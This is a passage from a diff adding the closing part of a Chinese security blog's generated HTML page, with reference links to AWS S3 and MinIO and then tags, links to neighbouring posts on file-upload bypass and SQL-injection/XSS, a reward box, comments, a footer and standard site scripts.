+AWS 亚马逊云 s3 对象存储云服务:    https://aws.amazon.com/cn/s3/
+minio 兼容 aws s3 的对象存储:      https://github.com/minio/minio</code></pre>
+
+      </div>
+
+      
+      <div class="article__tags reveal">
+        <span class="article__tags-label">标签</span>
+        <div class="tag-list">
+          
+            <a href="/tags/CSRF/"><span>CSRF</span></a>
+          
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span>文件上传</span></a>
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/"><span>Web安全</span></a>
+          
+        </div>
+      </div>
+      
+
+      <nav class="post-nav reveal" aria-label="前后文章">
+        
+          <a class="post-nav__prev" href="/file-upload-bypass/">
+            <span>← 上一篇</span>
+            <strong>文件上传漏洞常见限制与绕过</strong>
+          </a>
+        
+        
+          <a class="post-nav__next" href="/sql-getshell-and-xss/">
+            <span>下一篇 →</span>
+            <strong>SQL 注入 Getshell 与 XSS 跨站脚本攻击</strong>
+          </a>
+        
+      </nav>
+
+      
+      <div class="reward reveal">
+        <button type="button" class="reward__toggle" data-reward-toggle>
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v20M2 7h20v10H2z"/><path d="M12 2a7 7 0 0 1 0 10M12 12a7 7 0 0 0 0 10"/></svg>
+          打赏
+        </button>
+        <div class="reward__box" data-reward-box>
+          <p class="reward__title">你的赏识是我前进的动力</p>
+          <div class="reward__qrs">
+            
+              <figure><img src="/medias/reward/wechat.png" alt="微信赞赏码" loading="lazy"><figcaption>微信</figcaption></figure>
+            
+            
+              <figure><img src="/medias/reward/alipay.jpg" alt="支付宝收款码" loading="lazy"><figcaption>支付宝</figcaption></figure>
+            
+          </div>
+        </div>
+      </div>
+      
+
+      
+      <div class="cbox reveal" id="comments">
+        <div class="cbox__head"><span class="cbox__title">评论</span></div>
+        <div id="gitalk-container"></div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="site-footer__id">
+      <img class="site-footer__avatar" src="/images/clay-avatar.svg" alt="swfk2154" loading="lazy">
+      <div class="site-footer__id-text">
+        <strong>swfk 的安全笔记</strong>
+        <span>AI 安全 / 网络安全 / 工程实践</span>
+      </div>
+    </div>
+    <div class="site-footer__links">
+      
+        <a href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+          GitHub
+        </a>
+      
+      
+      
+        <a href="/atom.xml">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1.4"/></svg>
+          RSS
+        </a>
+      
+    </div>
+  </div>
+  <div class="site-footer__bar">
+    <span>© 2026 - 2026 swfk2154</span>
+    <span>由 <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> 驱动 · Clay 主题</span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display:none">访客 <span id="busuanzi_value_site_uv"></span></span>
+      <span id="busuanzi_container_site_pv" style="display:none">浏览 <span id="busuanzi_value_site_pv"></span></span>
+    
+  </div>
+</footer>
+
+  
+<div class="search-overlay" id="search-overlay" hidden>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-bar">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <input type="text" class="search-input" id="search-input" placeholder="搜索文章：标题 / 标签 / 正文…"
+             autocomplete="off" autocapitalize="off" spellcheck="false">
+      <button type="button" class="search-esc" data-search-close aria-label="关闭搜索">Esc</button>
+    </div>
+    <ul class="search-results" id="search-results"></ul>
+    <div class="search-hint">↑ ↓ 选择 · Enter 打开 · Esc 关闭</div>
+  </div>
+</div>
+
+  <button type="button" class="to-top" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M6 11l6-6 6 6"/></svg>
+  </button>
+  
+
+<div class="music-player" data-music-player>
+  <button type="button" class="music-player__toggle" data-music-toggle aria-expanded="false" aria-controls="music-player-panel" aria-label="打开音乐播放器" title="音乐">
+    <span class="music-player__disc" aria-hidden="true">
+      <img class="music-player__disc-cover" data-music-cover alt="" hidden referrerpolicy="no-referrer">
+      <svg class="music-player__disc-note" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+    </span>
+    <span class="music-player__pulse" aria-hidden="true"><i></i><i></i><i></i></span>
+  </button>
+
+  <section class="music-player__panel" id="music-player-panel" data-music-panel aria-hidden="true">
+    <div class="music-player__panel-head">
+      <div class="music-player__head-copy">
+        <span class="music-player__eyebrow">MUSIC</span>
+        <h2>BGM</h2>
+      </div>
+      <button type="button" class="music-player__close" data-music-close aria-label="收起">&#215;</button>
+    </div>
+    
+    <div class="music-player__box">
+      
+      <div class="music-player__pane is-active" data-music-pane="0">
+        <div class="music-player__mount" data-ap-mount="0"></div>
+      </div>
+      
+      
+    </div>
+    <p class="music-player__foot">来自网易云音乐 · 点击列表选曲</p>
+  </section>
+  <script>window.__CLAY_MUSIC__ = {"apis":["https://api.injahow.cn/meting/?server=:server&type=:type&id=:id","https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id"],"sources":[{"server":"netease","type":"playlist","id":"8792942606"}],"order":"list","listMaxHeight":"320px","autoplay":false};</script>
+</div>
+
+
+  
+<script>
+  window.__giscusConfig = {"enable":true,"repo":"swfk2154/swfk2154.github.io","repoId":"R_kgDORBu9qA","category":"Announcements","categoryId":"DIC_kwDORBu9qM4DEDSm","mapping":"pathname","reactionsEnabled":true,"inputPosition":"top","theme":"light","lang":"zh-CN"};
+</script>
+
+<script src="/js/clay.js"></script>
+<script src="/js/search.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/js/music-loader.js"></script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
